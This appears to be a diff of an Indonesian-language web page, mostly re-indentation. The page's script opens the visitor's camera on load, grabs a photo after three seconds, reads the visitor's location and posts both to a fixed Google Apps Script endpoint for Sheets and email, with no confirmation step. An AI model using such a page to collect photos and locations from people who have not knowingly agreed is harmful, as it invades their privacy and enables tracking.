@@ -17,7 +17,7 @@
 </head>
 <body>
 
-  <h2>📷 Ambil Foto & Lokasi Otomatis</h2>
+  <h2>📸 Ambil Foto & Lokasi</h2>
 
   <video id="video" autoplay playsinline></video><br>
   <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
@@ -25,68 +25,70 @@
   <p><strong>Lokasi Anda:</strong> <span id="location">Mengambil lokasi...</span></p>
 
   <script>
-  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxrrRsGjbX0hgv4vKlKOlnfO1YT-RdjYiJsmi3cR3ohTzelijRZCo65G4x_fCbhchC2Mw/exec"; // Ganti dengan URL Web App kamu
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxrrRsGjbX0hgv4vKlKOlnfO1YT-RdjYiJsmi3cR3ohTzelijRZCo65G4x_fCbhchC2Mw/exec";
 
-  async function startCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      document.getElementById('video').srcObject = stream;
-      setTimeout(captureAndSend, 3000);
-    } catch (err) {
-      alert('Gagal akses kamera: ' + err.message);
-    }
-  }
-
-  function getLocation(callback) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const { latitude, longitude } = pos.coords;
-        document.getElementById('location').textContent = `${latitude}, ${longitude}`;
-        callback({ latitude, longitude });
-      },
-      err => {
-        document.getElementById('location').textContent = 'Gagal ambil lokasi.';
-        callback(null);
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('video').srcObject = stream;
+        setTimeout(captureAndSend, 3000);
+      } catch (err) {
+        alert('Gagal akses kamera: ' + err.message);
       }
-    );
-  }
+    }
 
-  function captureAndSend() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL('image/png');
-
-    getLocation(location => {
-      if (!location) return;
-
-      const data = {
-        latitude: location.latitude,
-        longitude: location.longitude,
-        image: imageData
-      };
-
-      fetch(WEB_APP_URL, {
-        method: "POST",
-        body: JSON.stringify(data),
-        headers: {
-          "Content-Type": "application/json"
+    function getLocation(callback) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const { latitude, longitude } = pos.coords;
+          document.getElementById('location').textContent = `${latitude}, ${longitude}`;
+          callback({ latitude, longitude });
+        },
+        err => {
+          document.getElementById('location').textContent = 'Gagal ambil lokasi.';
+          callback(null);
         }
-      }).then(res => {
-        alert("Foto & lokasi terkirim!");
-      }).catch(err => {
-        alert("Gagal kirim data: " + err.message);
+      );
+    }
+
+    function captureAndSend() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/png');
+
+      getLocation(location => {
+        if (!location) return;
+
+        const data = {
+          latitude: location.latitude,
+          longitude: location.longitude,
+          image: imageData
+        };
+
+        fetch(WEB_APP_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        })
+        .then(res => res.text())
+        .then(result => {
+          alert("✅ Data terkirim ke Sheets & Email: " + result);
+        })
+        .catch(err => {
+          alert("❌ Gagal kirim data: " + err.message);
+        });
       });
-    });
-  }
+    }
 
-  window.onload = () => {
-    startCamera();
-    getLocation(() => {});
-  };
-</script>
-
+    window.onload = () => {
+      startCamera();
+      getLocation(() => {});
+    };
+  </script>
 
 </body>
 </html>
